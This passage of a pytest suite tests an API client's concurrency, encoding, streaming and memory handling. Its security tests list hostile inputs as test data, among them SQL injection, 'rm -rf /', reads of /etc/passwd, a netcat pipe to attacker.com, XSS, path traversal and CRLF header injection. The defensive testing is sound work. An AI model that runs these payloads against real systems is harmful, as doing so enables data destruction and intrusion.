    async def test_concurrent_context_manager_usage(self, mock_config):
        """Test concurrent usage of multiple context managers."""
        async def use_client_context():
            async with GenesisAPIClient(**mock_config) as client:
                # Simulate some work
                await asyncio.sleep(0.01)
                return client.api_key
        
        # Use multiple context managers concurrently
        tasks = [use_client_context() for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        # All should complete successfully
        assert len(results) == 10
        assert all(result == mock_config['api_key'] for result in results)
    
    def test_message_validation_with_circular_references(self, client):
        """Test message validation with circular reference structures."""
        # Create a circular reference structure
        circular_dict = {"key": "value"}
        circular_dict["self"] = circular_dict
        
        circular_message = ChatMessage(role="user", content=circular_dict)
        
        # Should handle circular references gracefully
        try:
            client._validate_messages([circular_message])
        except (ValidationError, RecursionError, ValueError):
            # Acceptable to reject circular references
            pass
    
    @pytest.mark.asyncio
    async def test_response_parsing_with_mixed_encoding(self, client, sample_messages, sample_model_config):
        """Test response parsing with mixed character encodings."""
        mixed_encoding_response = {
            'id': 'mixed-encoding-test',
            'choices': [{
                'message': {
                    'role': 'assistant',
                    'content': 'Hello 世界! Café naïve résumé 🌍 Москва العربية'
                }
            }],
            'usage': {'total_tokens': 25}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value=mixed_encoding_response
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            # Should handle mixed encoding properly
            assert result.id == 'mixed-encoding-test'
            assert '世界' in result.choices[0].message.content
            assert 'Café' in result.choices[0].message.content
            assert '🌍' in result.choices[0].message.content
    
    @pytest.mark.asyncio
    async def test_streaming_with_incomplete_utf8_sequences(self, client, sample_messages, sample_model_config):
        """Test streaming with incomplete UTF-8 sequences across chunk boundaries."""
        # UTF-8 sequence for "测试" split across chunks
        utf8_chunks = [
            b'{"choices": [{"delta": {"content": "Test \xe6\xb5\x8b"}}]}\n',  # "测" 
            b'{"choices": [{"delta": {"content": "\xe8\xaf\x95"}}]}\n',      # "试"
            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
        ]
        
        async def utf8_split_stream():
            for chunk in utf8_chunks:
                yield chunk
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=utf8_split_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            # Should handle UTF-8 sequences across chunk boundaries
            assert len(chunks) >= 2
            content_chunks = [c for c in chunks if hasattr(c.choices[0].delta, 'content') and c.choices[0].delta.content]
            assert len(content_chunks) >= 1
    
    def test_api_key_format_validation(self):
        """Test API key format validation with various formats."""
        valid_key_formats = [
            "sk-1234567890abcdef",
            "key_1234567890abcdef1234567890abcdef",
            "genesis-api-key-12345",
            "test.key.with.dots",
            "test-key-with-dashes",
            "test_key_with_underscores"
        ]
        
        for key_format in valid_key_formats:
            try:
                client = GenesisAPIClient(api_key=key_format)
                assert client.api_key == key_format
            except ValueError:
                # Some formats might have specific validation rules
                pass
    
    def test_model_config_parameter_type_coercion(self, client):
        """Test model config parameter type coercion and validation."""
        config = ModelConfig(name="test-model")
        
        # Test various type coercion scenarios
        coercion_tests = [
            ("temperature", "0.5", float),
            ("max_tokens", "1000", int),
            ("top_p", "0.9", float),
            ("temperature", 0.5, float),
            ("max_tokens", 1000, int),
            ("top_p", 0.9, float),
        ]
        
        for attr, value, expected_type in coercion_tests:
            original_value = getattr(config, attr, None)
            setattr(config, attr, value)
            
            try:
                client._validate_model_config(config)
                final_value = getattr(config, attr)
                # Should coerce to expected type or maintain original
                assert isinstance(final_value, expected_type) or final_value == original_value
            except ValidationError:
                # Acceptable if type coercion is not supported
                pass
    
    @pytest.mark.asyncio
    async def test_graceful_degradation_on_missing_response_fields(self, client, sample_messages, sample_model_config):
        """Test graceful degradation when response fields are missing."""
        degraded_responses = [
            # Missing usage field
            {
                'id': 'no-usage',
                'choices': [{'message': {'content': 'No usage info'}}]
            },
            # Missing choices field
            {
                'id': 'no-choices',
                'usage': {'total_tokens': 10}
            },
            # Missing message content
            {
                'id': 'no-content',
                'choices': [{'message': {'role': 'assistant'}}],
                'usage': {'total_tokens': 5}
            }
        ]
        
        for response in degraded_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                try:
                    result = await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                    # Should handle missing fields gracefully
                    assert result.id == response['id']
                except GenesisAPIError:
                    # Acceptable to fail on incomplete responses
                    pass
    
    @pytest.mark.asyncio
    async def test_high_concurrency_stress_test(self, client, sample_messages, sample_model_config):
        """Test high concurrency stress scenarios."""
        mock_response = {
            'id': 'stress-test',
            'choices': [{'message': {'content': 'Stress response'}}],
            'usage': {'total_tokens': 5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create 100 concurrent requests
            tasks = []
            for i in range(100):
                task = client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                tasks.append(task)
            
            # Should handle high concurrency without errors
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Most should succeed, allow for some failures under stress
            successful_results = [r for r in results if not isinstance(r, Exception)]
            assert len(successful_results) >= 80  # At least 80% success rate
    
    @pytest.mark.asyncio
    async def test_request_payload_size_limits(self, client, sample_model_config):
        """Test request payload size limits and handling."""
        # Create increasingly large payloads
        payload_sizes = [1024, 10240, 102400, 1048576]  # 1KB, 10KB, 100KB, 1MB
        
        for size in payload_sizes:
            large_content = "x" * size
            large_messages = [ChatMessage(role="user", content=large_content)]
            
            mock_response = {
                'id': f'large-payload-{size}',
                'choices': [{'message': {'content': f'Handled {size} bytes'}}],
                'usage': {'total_tokens': size // 4}  # Rough estimate
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                try:
                    result = await client.create_chat_completion(
                        messages=large_messages,
                        model_config=sample_model_config
                    )
                    # Should handle large payloads
                    assert result.id == f'large-payload-{size}'
                except ValidationError as e:
                    # Acceptable to reject payloads that are too large
                    assert "too long" in str(e) or "size" in str(e)
                except GenesisAPIError:
                    # Acceptable if server rejects large payloads
                    pass
    
    def test_thread_safety_with_shared_client_instance(self, client):
        """Test thread safety when using shared client instance."""
        import threading
        import concurrent.futures
        
        results = []
        errors = []
        
        def access_client_concurrently():
            """Simulate concurrent access to client properties and methods."""
            try:
                # Access various client properties
                api_key = client.api_key
                base_url = client.base_url
                timeout = client.timeout
                
                # Build headers (potentially thread-unsafe operation)
                headers = client._build_headers()
                
                results.append({
                    'api_key': api_key,
                    'base_url': base_url,
                    'timeout': timeout,
                    'headers': headers
                })
            except Exception as e:
                errors.append(e)
        
        # Run concurrent access from multiple threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(access_client_concurrently) for _ in range(50)]
            concurrent.futures.wait(futures)
        
        # Should have no errors and consistent results
        assert len(errors) == 0
        assert len(results) == 50
        
        # All results should be identical (thread-safe)
        first_result = results[0]
        for result in results[1:]:
            assert result['api_key'] == first_result['api_key']
            assert result['base_url'] == first_result['base_url']
            assert result['timeout'] == first_result['timeout']
    
    @pytest.mark.asyncio
    async def test_response_size_limits_and_memory_management(self, client, sample_messages, sample_model_config):
        """Test response size limits and memory management."""
        # Create a very large response
        large_response_content = "x" * (10 * 1024 * 1024)  # 10MB response
        
        large_response = {
            'id': 'large-response-test',
            'choices': [{'message': {'content': large_response_content}}],
            'usage': {'total_tokens': 2500000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=large_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Monitor memory usage
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            final_memory = process.memory_info().rss
            memory_increase = final_memory - initial_memory
            
            # Should handle large responses without excessive memory usage
            assert len(result.choices[0].message.content) == 10 * 1024 * 1024
            assert memory_increase < 50 * 1024 * 1024  # Less than 50MB increase


class TestGenesisAPIClientSecurityAndValidation:
    """Security-focused and validation tests."""
    
    def test_input_sanitization_for_injection_attacks(self, client):
        """Test input sanitization against various injection attacks."""
        malicious_inputs = [
            # SQL injection patterns
            ChatMessage(role="user", content="'; DROP TABLE users; --"),
            ChatMessage(role="user", content="1' OR '1'='1"),
            
            # NoSQL injection patterns
            ChatMessage(role="user", content='{"$gt": ""}'),
            ChatMessage(role="user", content='{"$where": "this.username == this.password"}'),
            
            # Command injection patterns
            ChatMessage(role="user", content="test; rm -rf /"),
            ChatMessage(role="user", content="test && cat /etc/passwd"),
            ChatMessage(role="user", content="test | nc attacker.com 4444"),
            
            # XSS patterns
            ChatMessage(role="user", content="<script>alert('xss')</script>"),
            ChatMessage(role="user", content="javascript:alert('xss')"),
            ChatMessage(role="user", content="<img src=x onerror=alert('xss')>"),
            
            # Path traversal patterns
            ChatMessage(role="user", content="../../../etc/passwd"),
            ChatMessage(role="user", content="..\\..\\..\\windows\\system32\\config\\sam"),
            
            # Template injection patterns
            ChatMessage(role="user", content="{{7*7}}"),
            ChatMessage(role="user", content="${7*7}"),
            ChatMessage(role="user", content="#{7*7}"),
        ]
        
        for malicious_msg in malicious_inputs:
            try:
                client._validate_messages([malicious_msg])
                # If validation passes, content should be preserved as-is
                # (sanitization is typically API server's responsibility)
                assert malicious_msg.content is not None
            except ValidationError:
                # Only acceptable if there are specific content filtering rules
                pass
    
    def test_header_injection_prevention_comprehensive(self, client):
        """Test comprehensive header injection prevention."""
        malicious_headers = [
            # CRLF injection
            {'X-Custom': 'value\r\nX-Injected: malicious'},
            {'User-Agent': 'Mozilla/5.0\nX-Injected: malicious'},
            
            # Null byte injection
            {'X-Custom': 'value\x00injected'},
            {'Authorization': 'Bearer token\x00malicious'},
            
            # Unicode normalization attacks
            {'X-Custom': 'value\u000aX-Injected: malicious'},
            {'X-Custom': 'value\u000dX-Injected: malicious'},
            
            # Control character injection
            {'X-Custom': 'value\x01\x02\x03'},
            {'X-Custom': 'value\x1f\x7f'},
        ]
        
        for headers in malicious_headers:
            built_headers = client._build_headers(headers)
            
            # Should sanitize or reject malicious headers
            for key, value in built_headers.items():
                value_str = str(value)
                assert '\r' not in value_str
                assert '\n' not in value_str
                assert '\x00' not in value_str
                # Check for other control characters
                assert not any(ord(c) < 32 and c not in '\t' for c in value_str)
    
    def test_api_key_exposure_prevention(self, client):
        """Test prevention of API key exposure in various contexts."""
        # Test string representations don't expose API key
        client_str = str(client)
        client_repr = repr(client)
        
        assert client.api_key not in client_str
        assert client.api_key not in client_repr
        
        # Test logging doesn't expose API key
        import logging
        import io
        
        log_capture = io.StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger('test_logger')
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        # Log client information
        logger.info(f"Client: {client}")
        logger.debug(f"Client details: {client.__dict__}")
        
        log_output = log_capture.getvalue()
        assert client.api_key not in log_output
        
        # Test exception messages don't expose API key
        try:
            raise ValueError(f"Client error: {client}")
        except ValueError as e:
            assert client.api_key not in str(e)
    
    def test_secure_default_configuration(self):
        """Test that default configuration follows security best practices."""
        client = GenesisAPIClient(api_key="test-key")
        
        # Should use HTTPS by default
        assert client.base_url.startswith('https://')
        
        # Should have reasonable timeout (not too long)
        assert client.timeout > 0
        assert client.timeout <= 300  # 5 minutes max
        
        # Should have reasonable retry limits
        assert client.max_retries >= 0
        assert client.max_retries <= 10
        
        # Should use secure headers
        headers = client._build_headers()
        assert 'User-Agent' in headers
        assert 'Authorization' in headers
        assert headers['Authorization'].startswith('Bearer ')
    
    def test_configuration_validation_against_malicious_values(self):
        """Test configuration validation against malicious values."""
        malicious_configs = [
            # Malicious URLs
            {'api_key': 'test', 'base_url': 'javascript:alert("xss")'},
            {'api_key': 'test', 'base_url': 'data:text/html,<script>alert("xss")</script>'},
            {'api_key': 'test', 'base_url': 'file:///etc/passwd'},
            
            # Extreme timeout values
            {'api_key': 'test', 'timeout': float('inf')},
            {'api_key': 'test', 'timeout': -1},
            {'api_key': 'test', 'timeout': 1e10},
            
            # Extreme retry values
            {'api_key': 'test', 'max_retries': float('inf')},
            {'api_key': 'test', 'max_retries': -1},
            {'api_key': 'test', 'max_retries': 1e6},
        ]
        
        for config in malicious_configs:
            with pytest.raises(ValueError):
                GenesisAPIClient(**config)
    
    @pytest.mark.asyncio
    async def test_response_validation_against_malicious_content(self, client, sample_messages, sample_model_config):
        """Test response validation against potentially malicious content."""
        malicious_responses = [
            # Extremely long response
            {
                'id': 'long-response',
                'choices': [{'message': {'content': 'x' * (100 * 1024 * 1024)}}],  # 100MB
                'usage': {'total_tokens': 25000000}
            },
            # Response with control characters
            {
                'id': 'control-chars',
                'choices': [{'message': {'content': 'test\x00\x01\x02\x03'}}],
                'usage': {'total_tokens': 10}
            },
            # Response with Unicode vulnerabilities
            {
                'id': 'unicode-vuln',
                'choices': [{'message': {'content': '\u202e\u0040\u202d'}}],  # Unicode override
                'usage': {'total_tokens': 5}
            },
        ]
        
        for response in malicious_responses:
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                try:
                    result = await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                    # Should handle malicious content gracefully
                    assert result.id == response['id']
                except (GenesisAPIError, ValidationError, MemoryError):
                    # Acceptable to reject malicious content
                    pass


class TestGenesisAPIClientPerformanceOptimization:
    """Performance optimization and efficiency tests."""
    
    @pytest.mark.asyncio
    async def test_connection_reuse_efficiency(self, client, sample_messages, sample_model_config):
        """Test connection reuse efficiency across multiple requests."""
        mock_response = {
            'id': 'connection-reuse-test',
            'choices': [{'message': {'content': 'Reused connection'}}],
            'usage': {'total_tokens': 10}
        }
        
        connection_count = 0
        
        class ConnectionCountingSession:
            def __init__(self):
                nonlocal connection_count
                connection_count += 1
                self.closed = False
            
            def post(self, *args, **kwargs):
                mock_response_obj = Mock()
                mock_response_obj.status = 200
                mock_response_obj.json = AsyncMock(return_value=mock_response)
                return AsyncMock(return_value=mock_response_obj)
        
        with patch('aiohttp.ClientSession', ConnectionCountingSession):
            # Make multiple requests
            for _ in range(10):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
        
        # Should reuse connections (minimal new sessions)
        assert connection_count <= 2  # Allow for initial + potential recreation
    
    @pytest.mark.asyncio
    async def test_memory_efficiency_with_large_conversations(self, client, sample_model_config):
        """Test memory efficiency with large conversation histories."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Create a large conversation history
        large_conversation = []
        for i in range(1000):
            large_conversation.append(ChatMessage(role="user", content=f"Message {i} with some content"))
            large_conversation.append(ChatMessage(role="assistant", content=f"Response {i} with some content"))
        
        mock_response = {
            'id': 'large-conversation-test',
            'choices': [{'message': {'content': 'Processed large conversation'}}],
            'usage': {'total_tokens': 50000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=large_conversation,
                model_config=sample_model_config
            )
            
            final_memory = process.memory_info().rss
            memory_increase = final_memory - initial_memory
            
            # Should handle large conversations efficiently
            assert result.id == 'large-conversation-test'
            assert memory_increase < 100 * 1024 * 1024  # Less than 100MB increase
    
    @pytest.mark.asyncio
    async def test_json_parsing_optimization(self, client, sample_messages, sample_model_config):
        """Test JSON parsing optimization with various response sizes."""
        response_sizes = [1024, 10240, 102400, 1048576]  # 1KB to 1MB
        
        for size in response_sizes:
            large_content = "x" * size
            large_response = {
                'id': f'json-parse-{size}',
                'choices': [{'message': {'content': large_content}}],
                'usage': {'total_tokens': size // 4}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=large_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                import time
                start_time = time.time()
                
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                end_time = time.time()
                parsing_time = end_time - start_time
                
                # Should parse JSON efficiently
                assert result.id == f'json-parse-{size}'
                assert parsing_time < 1.0  # Should complete within 1 second
    
    @pytest.mark.asyncio
    async def test_streaming_memory_efficiency(self, client, sample_messages, sample_model_config):
        """Test streaming memory efficiency with large streams."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Create a large streaming response
        large_chunks = []
        for i in range(10000):
            large_chunks.append({'choices': [{'delta': {'content': f'Chunk {i} with content '}}]})
        large_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def large_stream():
            for chunk in large_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=large_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunk_count = 0
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunk_count += 1
                
                # Check memory usage periodically
                if chunk_count % 1000 == 0:
                    current_memory = process.memory_info().rss
                    memory_increase = current_memory - initial_memory
                    # Memory should remain stable (not grow indefinitely)
                    assert memory_increase < 50 * 1024 * 1024  # Less than 50MB
            
            final_memory = process.memory_info().rss
            final_memory_increase = final_memory - initial_memory
            
            # Should handle streaming efficiently
            assert chunk_count == 10001
            assert final_memory_increase < 100 * 1024 * 1024  # Less than 100MB total
    
    def test_validation_performance_with_large_datasets(self, client):
        """Test validation performance with large datasets."""
        # Create large message sets
        large_message_sets = [
            # Many small messages
            [ChatMessage(role="user", content=f"Message {i}") for i in range(1000)],
            # Few large messages
            [ChatMessage(role="user", content="x" * 100000) for _ in range(10)],
            # Mixed sizes
            [ChatMessage(role="user", content="x" * (i * 1000)) for i in range(1, 101)],
        ]
        
        for messages in large_message_sets:
            import time
            start_time = time.time()
            
            try:
                client._validate_messages(messages)
                end_time = time.time()
                validation_time = end_time - start_time
                
                # Should validate efficiently
                assert validation_time < 1.0  # Should complete within 1 second
            except ValidationError:
                # Acceptable if validation rules reject large datasets
                pass
    
    @pytest.mark.asyncio
    async def test_concurrent_request_resource_management(self, client, sample_messages, sample_model_config):
        """Test resource management with concurrent requests."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        initial_threads = process.num_threads()
        
        mock_response = {
            'id': 'concurrent-resource-test',
            'choices': [{'message': {'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Create many concurrent requests
            tasks = []
            for _ in range(100):
                task = client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            final_memory = process.memory_info().rss
            final_threads = process.num_threads()
            
            # Should manage resources efficiently
            assert len(results) == 100
            memory_increase = final_memory - initial_memory
            thread_increase = final_threads - initial_threads
            
            # Resource usage should be reasonable
            assert memory_increase < 50 * 1024 * 1024  # Less than 50MB
            assert thread_increase < 20  # Reasonable thread count increase


if __name__ == "__main__":
    # Run all tests including the new comprehensive edge case tests
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-m", "not (integration or performance)",
        "--durations=15",
        "-k", "TestGenesisAPIClient"
    ])